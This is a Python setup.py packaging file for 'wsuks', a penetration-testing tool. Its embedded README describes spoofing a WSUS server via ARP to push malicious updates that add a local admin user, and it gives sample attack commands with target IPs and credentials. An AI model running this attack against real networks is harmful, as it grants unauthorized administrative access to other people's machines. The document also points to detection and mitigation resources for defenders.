# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['wsuks', 'wsuks.helpers']

package_data = \
{'': ['*'], 'wsuks': ['executables/*', 'xml_files/*']}

install_requires = \
['bs4>=0.0.1,<0.0.2',
 'impacket>=0.10.0,<0.11.0',
 'lxml>=4.9.3,<5.0.0',
 'scapy>=2.5.0,<3.0.0',
 'termcolor>=2.2.0,<3.0.0']

entry_points = \
{'console_scripts': ['wsuks = wsuks.wsuks:main']}

setup_kwargs = {
    'name': 'wsuks',
    'version': '0.4.2',
    'description': 'A Tool for automating the MITM attack on the WSUS connection',
    'long_description': '![Supported Python versions](https://img.shields.io/badge/python-3.8.1+-blue.svg) [![Twitter](https://img.shields.io/twitter/follow/al3x_n3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)\n# wsuks\n_Weaponizing the WSUS Attack_\n\nGaining local administrative access on a Windows machine that is part of a domain is typically the initial step towards acquiring domain admin privileges during a penetration test. In order to exploit the WSUS attack automatically, this tool spoofs the IP address of the WSUS server within the network using ARP, and when the client requests Windows updates, it provides its own malicious updates instead.\nBy default, a Windows client requests updates every 24 hours. \n\nBoth the executable file served (Default: PsExec64.exe) and the executed command can be changed as needed.\n\nPrerequisits:\n- The target Client must be on the local network\n- The Windows Server Update Service (WSUS) must be configured using HTTP\n\nResult:\n- After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created\n\n## Installation\nUsing pipx (recommended):\n```\nsudo apt install python3-pipx\npipx ensurepath\npipx install wsuks\nsudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks\n```\n\nUsing poetry:\n```\nsudo apt install python3-poetry\ngit clone https://github.com/NeffIsBack/wsuks\ncd wsuks\nsudo poetry install\n```\n\n## Usage\n❗wsuks must be run as root❗\n\nUsing pipx you can simply run `sudo wsuks ...` anywhere on the system.\\\nUsing poetry you must be in the wsuks folder and begin every command with `sudo poetry run wsuks ...`\n\n#### Specify known WSUS-Server and create local admin user:\n```\nsudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20\n```\n#### Specify known WSUS-Server and add provided domain user to local admin group (Domain is required!):\n```\nsudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local\n```\n#### Autodiscover the WSUS-Server by only specifying the domain user with the dc-ip:\n```\nsudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1\n```\n\n## About & Mitigation\nIn the [PyWSUS](https://github.com/GoSecure/pywsus) Repository from GoSecure you can find a great documentation how to you could detect and mitigate this attack.\nThey also wrote a great Guide demonstrating how this attack works in detail [here](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/).\n\nThis Tool is based on the following projects:\n- https://github.com/GoSecure/pywsus\n- https://github.com/GoSecure/wsuspect-proxy\n\n',
    'author': 'Alexander Neff',
    'author_email': 'alex99.neff@gmx.de',
    'maintainer': 'None',
    'maintainer_email': 'None',
    'url': 'None',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'entry_points': entry_points,
    'python_requires': '>=3.8.1,<4.0.0',
}


setup(**setup_kwargs)
